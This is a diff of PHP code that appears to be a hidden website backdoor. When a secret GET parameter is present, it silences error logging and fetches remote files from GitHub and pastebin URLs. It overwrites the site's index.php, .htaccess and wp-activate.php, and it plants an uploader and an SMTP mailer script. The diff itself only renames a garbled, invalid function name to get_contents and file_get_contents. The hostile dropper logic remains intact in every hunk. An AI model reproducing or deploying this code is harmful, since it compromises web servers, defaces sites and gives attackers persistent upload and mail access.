@@ -10,7 +10,7 @@ if(isset($_GET["h3ct0r"])&&$_GET["h3ct0r"]=="sec"){
  @ini_set('error_log',NULL);
  @ini_set('log_errors',0);
  @ini_set('display_errors', 0);
-function 2f32f23f23f($url){
+function get_contents($url){
   $ch = curl_init("$url");
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
@@ -30,15 +30,15 @@ function 2f32f23f23f($url){
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/smtphec.php", 0644);
 echo "Hectopat"."<br>";
 
-$hecindex = 2f32f23f23f('https://raw.githubusercontent.com/HecSec/New/main/index.php');
+$hecindex = get_contents('https://raw.githubusercontent.com/HecSec/New/main/index.php');
 $indexyol = $_SERVER['DOCUMENT_ROOT'] . "/indeeex.php" ; 
 if (file_put_contents ($indexyol, $hecindex));
 
-$htaccess = 2f32f23f23f('http://pastebin.com/raw/VgBTWCqv'); 
+$htaccess = get_contents('http://pastebin.com/raw/VgBTWCqv'); 
 $htaccesss = $_SERVER['DOCUMENT_ROOT'] . "/.htaccess" ;
 if (file_put_contents ($htaccesss, $htaccess));
 
-$wpoptions = 2f32f23f23f('https://raw.githubusercontent.com/XetSec/Xet/main/options'); 
+$wpoptions = get_contents('https://raw.githubusercontent.com/XetSec/Xet/main/options'); 
 $wpoptionss = $_SERVER['DOCUMENT_ROOT'] . "/wp-options.php" ;
 if (file_put_contents ($wpoptionss, $wpoptions));
 
@@ -49,15 +49,15 @@ if (file_exists($dosya)) {
     @rename($_SERVER['DOCUMENT_ROOT'] . "/index.php",$_SERVER['DOCUMENT_ROOT'] . "/indeex.php");
 }
 
-$momindex = 2f32f23f23f('https://raw.githubusercontent.com/HecSec/New/main/index.php');
+$momindex = get_contents('https://raw.githubusercontent.com/HecSec/New/main/index.php');
 $momindexx = $_SERVER['DOCUMENT_ROOT'] . "/index.php" ; 
 if (file_put_contents($momindexx, $momindex));
 
-$moduler = 2f32f23f23f('https://raw.githubusercontent.com/HecSec/New/main/wp-activate.php');
+$moduler = get_contents('https://raw.githubusercontent.com/HecSec/New/main/wp-activate.php');
 $modulerr = $_SERVER['DOCUMENT_ROOT'] . "/wp-activate.php";
 if (file_put_contents($modulerr, $moduler));
 
-$smtphec = 2f32f23f23f('https://raw.githubusercontent.com/HecSec/New/main/smtphec.php');
+$smtphec = get_contents('https://raw.githubusercontent.com/HecSec/New/main/smtphec.php');
 $smtphecc = $_SERVER['DOCUMENT_ROOT'] . "/smtphec.php";
 if (file_put_contents($smtphecc, $smtphec));
 
@@ -189,11 +189,11 @@ if(file_exists($hector4)){
 }}
 /*BURDAN yukarÄ± petrashop*/
 
-$indexx = file_2f32f23f23f($_SERVER['DOCUMENT_ROOT']."/wp-activate.php");
-$antiseo = file_2f32f23f23f ($_SERVER['DOCUMENT_ROOT']."/indeeex.php");
-$uploadder = file_2f32f23f23f($_SERVER['DOCUMENT_ROOT']."/wp-options.php");
-$hta = file_2f32f23f23f($_SERVER['DOCUMENT_ROOT']."/.htaccess");
-$smtpheec = file_2f32f23f23f($_SERVER['DOCUMENT_ROOT']."/smtphec.php");
+$indexx = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-activate.php");
+$antiseo = file_get_contents ($_SERVER['DOCUMENT_ROOT']."/indeeex.php");
+$uploadder = file_get_contents($_SERVER['DOCUMENT_ROOT']."/wp-options.php");
+$hta = file_get_contents($_SERVER['DOCUMENT_ROOT']."/.htaccess");
+$smtpheec = file_get_contents($_SERVER['DOCUMENT_ROOT']."/smtphec.php");
 /*Olusturulcak dosya ismi*/
 /*dosya yolu*/
 $hec = $_SERVER['DOCUMENT_ROOT'] . "/../";
